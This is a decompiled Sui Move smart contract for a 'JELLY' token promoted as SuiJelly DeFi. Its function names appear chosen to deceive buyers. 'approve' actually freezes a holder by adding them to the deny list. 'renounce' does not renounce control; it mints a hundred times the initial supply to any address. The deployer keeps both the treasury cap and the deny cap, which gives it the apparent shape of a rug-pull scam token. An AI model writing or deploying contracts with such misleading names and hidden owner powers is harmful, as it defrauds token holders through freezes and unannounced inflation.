module 0xf067d3425585b8ff86fff259bc5948f3b8955feb1baf8de484834ca162724dc2::jelly {
    struct JELLY has drop {
        dummy_field: bool,
    }

    public entry fun approve(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<JELLY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<JELLY>(arg0, arg1, arg2, arg3);
    }

    public entry fun approved(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<JELLY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<JELLY>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: JELLY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<JELLY>(arg0, 2, b"JELLY", b"JELLY", b"Explore the fluid world of decentralized finance with SuiJelly. Powered by the fast and scalable Sui blockchain, Suijelly offers a seamless experience in DeFi. https://x.com/SuiJellyf https://suijelly.fun/ ", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://suijelly.fun/sui.png"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<JELLY>>(v2);
        let v4 = 0x2::tx_context::sender(arg1);
        0x2::coin::mint_and_transfer<JELLY>(&mut v3, 1000000000, v4, arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<JELLY>>(v3, v4);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<JELLY>>(v1, v4);
    }

    public entry fun renounce(arg0: &mut 0x2::coin::TreasuryCap<JELLY>, arg1: address, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<JELLY>(arg0, 100000000000, arg1, arg2);
    }

    // decompiled from Move bytecode v6
}

